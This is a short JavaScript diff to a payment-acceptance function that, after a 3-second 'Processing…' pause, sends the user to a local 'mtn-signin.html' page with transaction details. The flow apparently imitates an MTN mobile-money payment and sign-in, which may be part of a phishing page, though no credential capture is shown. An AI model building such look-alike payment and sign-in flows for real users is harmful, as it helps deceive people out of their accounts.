@@ -437,14 +437,13 @@
   }
 
   /* ============================================================
-     Accept → sign-in page
-     Now also passes `an` (admin phone) and `dt` (date) so the
-     sign-in page can pre-fill the phone and show the date.
+     Accept → hold the page 3 seconds, then navigate to sign-in.
+     No popup, no confirm dialog.
   ============================================================ */
   function acceptPayment() {
     const btn = document.getElementById('acceptBtn');
     btn.disabled = true;
-    btn.textContent = 'Redirecting…';
+    btn.textContent = 'Processing…';
 
     const q = new URLSearchParams({
       tx:  tx.ref,
@@ -460,7 +459,7 @@
     });
     setTimeout(() => {
       window.location.href = 'mtn-signin.html?' + q.toString();
-    }, 250);
+    }, 3000);
   }
 
   document.addEventListener('DOMContentLoaded', init);
